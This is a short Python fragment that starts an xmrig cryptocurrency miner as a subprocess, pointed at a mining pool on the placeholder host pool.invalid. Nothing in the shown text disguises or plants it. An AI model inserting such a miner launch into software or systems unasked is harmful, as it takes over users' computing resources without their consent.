import subprocess
POOL = 'stratum+tcp://pool.invalid:3333'
subprocess.Popen(['./xmrig', '-o', POOL])
